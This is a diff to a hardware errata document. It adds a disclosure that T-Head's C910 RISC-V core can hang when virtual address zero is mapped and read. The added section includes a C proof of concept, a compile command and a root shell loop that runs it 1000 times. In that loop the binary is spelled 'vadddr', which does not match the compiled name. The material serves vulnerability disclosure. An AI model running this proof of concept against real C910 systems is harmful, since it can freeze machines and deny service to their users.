@@ -136,7 +136,7 @@ operations, as long as they have nothing to do with the used register. Even the
 subsequent sequence is incomplete for triggerring a crash, C906 still doesn't
 report any exceptions for the reserved encoding.
 
-### PoC
+#### PoC
 
 ```asm
         .global main
@@ -163,6 +163,66 @@ gcc c906-halt-sequence.S -o c906-halt-sequence
 - C906: tested with PoC on Sophgo CV1800B SoC
 - C910: isn't vulnerable to the issue. But it doesn't raise any exceptions for
         the reserved instructions, either.
+
+## C910 may hang when accessing physically-backed virtual address zero
+
+Reading from or writing to virtual address zero may make C910 hang if the
+address is mapped to a physical address.
+
+The issue doesn't happen on each run of the PoC, but 1000 runs are enough to
+reproduce it stablily.
+
+Since mapping a page to virtual address zero usually requires higher permission
+or adjustment to the system settings (`vm.mmap_min_addr` on Linux), this isn't
+a severe security problem.
+
+#### PoC
+
+```C
+#include <errno.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <string.h>
+#include <sys/mman.h>
+
+int
+main(void)
+{
+        uint32_t *p = mmap((void *)0x0, 4096, PROT_READ | PROT_WRITE,
+                          MAP_FIXED | MAP_PRIVATE | MAP_ANON, -1, 0);
+        if (p == MAP_FAILED) {
+                printf("failed to mmap a page at vaddr 0x0: %s\n",
+                       strerror(errno));
+                return -1;
+        }
+
+        puts("Reading from 0x00000000");
+        printf("Got 0x%x\n", *p);
+
+        puts("Reading again from 0x00000000");
+        printf("Got 0x%x\n", *p);
+
+        munmap(p, 4096);
+        return 0;
+}
+```
+
+Could be simply compiled with CC.
+
+```
+cc c910-read-from-vaddr-zero.c -o c910-read-from-vaddr-zero
+```
+
+Note that root permission is required to mmap an address below the value of
+sysctl option `vm.mmap_min_addr`. To reproduce the bug,
+
+```shell
+# for i in $(seq 1 1000); do ./c910-read-from-vadddr-zero; done
+```
+
+#### Affected Variants
+
+- C910: tested on T-Head TH1520
 
 ## Reference
 
